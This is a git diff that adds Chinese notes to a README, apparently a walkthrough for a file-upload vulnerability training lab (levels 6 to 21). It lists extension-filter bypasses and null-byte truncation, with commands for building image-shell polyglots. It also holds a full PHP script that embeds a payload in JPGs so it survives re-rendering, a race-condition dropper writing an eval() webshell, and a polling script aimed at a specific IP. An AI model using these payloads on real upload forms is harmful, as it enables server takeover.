@@ -256,33 +256,378 @@ SetHandler application/x-httpd-php
 
 ### lab6
 
+过滤的都是小写，并且没有strtolower，传1.Php即可绕过
 
 
 
+### lab7
+
+对文件名后的`.`进行删除，但是没有限制文件名中是否包含空格。
+
+上传：`1.php ` 即可（有空格）
+
+### lab8
+
+去除了文件名中的空格，但是没有去除.
+
+上传1.php.即可绕过
+
+### lab9
+
+没有::\$DATA
+
+```
+在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名
+
+例如:"phpinfo.php::$DATA"Windows会自动去掉末尾的::$DATA变成"phpinfo.php"
+```
+
+于是1.php::\$DATA
+
+### lab10
+
+前面的过滤都做了，但是没有循环：`1.php. .`(<-有空格)
+
+### lab11
+
+```php+HTML
+<?php
+$bodytag = str_ireplace("%body%", "black", "<body text=%BODY%>");
+echo $bodytag; // <body text=black>
+?>
+```
 
 
 
+它将后缀去掉了：
+
+![image-20220117195128806](README/image-20220117195128806.png)
 
 
 
+还是只做了一次过滤，双写绕过`1.pphphp`
+
+### lab12
+
+白名单，且已经指定了目录
+
+![image-20220117201713021](README/image-20220117201713021.png)
+
+可以00截断：
+
+```
+00截断前提：
+magic_quotes_gpc = Off
+php版本小于5.3.4
+```
+
+### lab13
+
+因为post不会像get对`%00`进行自动解码，所以需要hex 00截断
+
+![image-20220117202605041](README/image-20220117202605041.png)
 
 
 
+### lab14
+
+图片马
+
+文件头标志
+
+```
+unpack() ：从二进制字符串对数据进行解包。
+fread()：读取打开的文件，函数会在到达指定长度或者读到文件末尾时，停止运行。
+```
 
 
 
+```
+图片马制作方式
+Linux下：
+cat 1.png 1.php > 2.png
+Windows下：
+copy 1.png /b + 1.php /a 2.png
+```
+
+成功上传图片马后利用`解析漏洞`或`本地文件包含漏洞`解析图片马
+
+![image-20220117205614364](README/image-20220117205614364.png)
+
+![image-20220117205638191](README/image-20220117205638191.png)
+
+### lab15
+
+与14关一样，只不过用到了getimagesize函数，可以用于检测文件头
+
+### lab16
+
+与前两关一样，但是需要打开php_exif，
+
+![image-20220117211754108](README/image-20220117211754108.png)
+
+```php
+exif_imagetype#读取一个图像的第一个字节并检查其签名
+```
+
+本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 $_SERVER['HTTP_ACCEPT'] 结合使用来检查浏览器是否可以显示某个指定的图像。
+
+### lab17
+
+>   https://xz.aliyun.com/t/2657
+
+主要是把二次渲染绕过
+imagecreatefromjpeg（）函数
+
+首先来看gif图：
+
+将含有一句话的图片马上传，显示失败，下载图片，hex打开发现后面写入的马已被去除，对比前后图片的差异，在未发生变化的地方写入，上传，成功绕过。
 
 
 
+再来看png图：
+
+这里有点复杂，直接看上面先知的文章吧
+
+jpg图的话使用脚本做图片马即可。
+
+脚本：
+
+```php
+<?php
+    /*
+
+    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+    It is necessary that the size and quality of the initial image are the same as those of the processed image.
+
+    1) Upload an arbitrary image via secured files upload script
+    2) Save the processed image and launch:
+    jpg_payload.php <jpg_name.jpg>
+
+    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+
+    Since the most straightforward injection method is used, the following problems can occur:
+    1) After the second processing the injected data may become partially corrupted.
+    2) The jpg_payload.php script outputs "Something's wrong".
+    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+
+    Sergey Bobrov @Black2Fan.
+
+    See also:
+    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+
+    */
+
+    $miniPayload = "<?=phpinfo();?>";
 
 
-黑名单里有htaccess，大写绕过，phP，只不过我没成功
+    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
+        die('php-gd is not installed');
+    }
 
-也可以（黑名单验证，.user.ini.）
+    if(!isset($argv[1])) {
+        die('php jpg_payload.php <jpg_name.jpg>');
+    }
 
-先上传一个以auto_prepend_file=1.gif为内容的.user.ini文件，然后再上传一个内容为php的一句话的脚本，命名为1.gif，.user.ini文件里的意思是：所有的php文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。
+    set_error_handler("custom_error_handler");
+
+    for($pad = 0; $pad < 1024; $pad++) {
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+
+        if($dis->readShort() != 0xFFD8) {
+            die('Incorrect SOI marker');
+        }
+
+        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
+            $marker = $dis->readByte();
+            $size = $dis->readShort() - 2;
+            $dis->skip($size);
+            if($marker === 0xDA) {
+                $startPos = $dis->seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat("\0",$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) {
+                    while((!$dis->eof())) {
+                        if($dis->readByte() === 0xFF) {
+                            if($dis->readByte !== 0x00) {
+                                break;
+                            }
+                        }
+                    }
+                    $stopPos = $dis->seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat("\0",$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                } elseif($correctImage) {
+                    $outStream = $outStreamTmp;
+                } else {
+                    break;
+                }
+                if(checkImage('payload_'.$argv[1], $outStream)) {
+                    die('Success!');
+                } else {
+                    break;
+                }
+            }
+        }
+    }
+    unlink('payload_'.$argv[1]);
+    die('Something\'s wrong');
+
+    function checkImage($filename, $data, $unlink = FALSE) {
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    }
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
+            if(isset($m[1])) {
+                $extraBytes = (int)$m[1];
+            }
+        }
+    }
+
+    class DataInputStream {
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order = false, $fromString = false) {
+            $this->binData = '';
+            $this->order = $order;
+            if(!$fromString) {
+                if(!file_exists($filename) || !is_file($filename))
+                    die('File not exists ['.$filename.']');
+                $this->binData = file_get_contents($filename);
+            } else {
+                $this->binData = $filename;
+            }
+            $this->size = strlen($this->binData);
+        }
+
+        public function seek() {
+            return ($this->size - strlen($this->binData));
+        }
+
+        public function skip($skip) {
+            $this->binData = substr($this->binData, $skip);
+        }
+
+        public function readByte() {
+            if($this->eof()) {
+                die('End Of File');
+            }
+            $byte = substr($this->binData, 0, 1);
+            $this->binData = substr($this->binData, 1);
+            return ord($byte);
+        }
+
+        public function readShort() {
+            if(strlen($this->binData) < 2) {
+                die('End Of File');
+            }
+            $short = substr($this->binData, 0, 2);
+            $this->binData = substr($this->binData, 2);
+            if($this->order) {
+                $short = (ord($short[1]) << 8) + ord($short[0]);
+            } else {
+                $short = (ord($short[0]) << 8) + ord($short[1]);
+            }
+            return $short;
+        }
+
+        public function eof() {
+            return !$this->binData||(strlen($this->binData) === 0);
+        }
+    }
+?>
+```
+
+### lab18
+
+18到20是条件竞争
+
+可以通过条件竞争进行上传绕过
+先上传一个WebShell脚本1.php，1.php的内容是生成一个新的WebShell脚本shell.php，1.php代码如下：
+
+```php
+<?php
+　　fputs(fopen('../shell.php','w'),'<?php @eval($_POST['cmd'])?>');
+?>
+```
+
+当1.php上传成功之后，客户端立即访问1.php，则会在服务器当前目录下自动生成shell.php，这时攻击者就完成了通过时间差上传webshell。
+
+```python
+import requests
+url = "http://8.142.44.97:1111/upload/1.php"
+while True:
+    html = requests.get(url)
+    if html.status_code == 200:
+        print("OK")
+        break
+```
+
+### lab19
+
+也是条件竞争，路径有点问题，改一下：
+
+![image-20220117223401220](README/image-20220117223401220.png)
+
+和lab18一样
+
+### lab20
+
+解法一：
+
+move_uploaded_file()函数中的img_path是由post参数save_name控制的，可以在save_name利用%00截断
 
 
 
+![image-20220117223817992](README/image-20220117223817992.png)
+
+![image-20220117223842136](README/image-20220117223842136.png)
+
+作者本义应该不是这个。
+
+解法二：
+
+move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.
+
+![image-20220117224126355](README/image-20220117224126355.png)
+
+### lab21
+
+这一关是利用数组绕过验证
+
+可以发现`$file_name`经过`reset($file) . '.' . $file[count($file) - 1];`处理。
+
+如果上传的是数组的话，会跳过`$file = explode('.', strtolower($file));`。并且后缀有白名单过滤
 
 
+
+而最终的文件名后缀取的是`$file[count($file) - 1]`，因此我们可以让`$file`为数组。`$file[0]`为`1.php/`，也就是`reset($file)`，然后再令`$file[2]`为白名单中的jpg。此时`end($file)`等于jpg，`$file[count($file) - 1]`为空。而 `$file_name = reset($file) . '.' . $file[count($file) - 1];`，也就是`1.php/.`，最终`move_uploaded_file`会忽略掉`/.`，最终上传`1.php`。
+
+![image-20220117225055765](README/image-20220117225055765.png)
